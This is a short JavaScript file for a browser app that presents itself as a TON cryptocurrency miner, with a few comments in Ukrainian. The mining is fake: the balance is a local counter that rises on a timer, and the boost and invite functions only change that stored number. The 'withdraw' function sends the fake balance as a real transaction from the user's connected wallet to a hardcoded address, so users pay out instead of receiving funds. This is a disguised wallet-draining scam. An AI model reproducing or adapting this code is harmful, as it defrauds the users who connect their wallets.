const tonConnectUI = new TonConnectUI({
    manifestUrl: "https://denus888.github.io/Ton-Miner/tonconnect-manifest.json"
});

const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW";

let balance = parseFloat(localStorage.getItem("balance")) || 0;
let mining = localStorage.getItem("mining") === "true";
let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
let minDeposit = 1;
let miningInterval = null;

function updateBalanceUI(){
    document.getElementById("balance").innerText = balance.toFixed(6);
}

// Підключення гаманець
tonConnectUI.onStatusChange(wallet=>{
    if(wallet){
        console.log("Wallet connected:", wallet.account.address);
    }
});

// Майнінг без питань
function startMining(){
    if(mining) return;
    mining = true;
    localStorage.setItem("mining","true");
    miningInterval = setInterval(()=>{
        balance += miningSpeed;
        updateBalanceUI();
        localStorage.setItem("balance",balance);
    },1000);
}

// Boost 1/5/15 TON
function buyBoost(amount){
    let increment = amount===1?0.000001929:amount===5?0.000005787:0.0000173611;
    miningSpeed += increment;
    localStorage.setItem("miningSpeed",miningSpeed);
}

// Invite
function inviteFriends(){
    balance += 0.01;
    localStorage.setItem("balance",balance);
    updateBalanceUI();
}

// Withdraw
async function withdraw(){
    if(balance < minDeposit) return;
    try{
        await tonConnectUI.sendTransaction({
            validUntil: Math.floor(Date.now()/1000)+60,
            messages:[{
                address: walletAddress,
                amount: balance.toFixed(9),
                payload:""
            }]
        });
        balance = 0; // після успішного виводу можна обнулити або залишити
        updateBalanceUI();
        minDeposit = 5;
        localStorage.setItem("minDeposit",minDeposit);
    } catch(e){
        console.error(e);
    }
}

document.addEventListener("DOMContentLoaded", updateBalanceUI);